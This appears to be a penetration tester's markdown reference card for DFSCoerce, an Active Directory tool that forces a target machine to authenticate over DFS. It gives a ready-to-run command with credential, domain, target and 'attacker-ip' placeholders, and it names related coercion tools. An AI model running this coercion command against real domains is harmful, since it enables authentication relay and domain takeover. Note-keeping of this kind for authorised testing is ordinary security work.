---
tags: [tool, activedirectory, coercion]
tool: "dfscoerce"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# DFSCoerce - DFS Coercion

## Tool Overview
Purpose: Coerce authentication via Distributed File System
Location: ~/tools/activedirectory/DFSCoerce/dfscoerce.py

## How to Use It
python3 dfscoerce.py -u user -p pass -d domain.local -t target-ip -l attacker-ip

## Related Tools
petitpotam, shadowcoerce, coercer
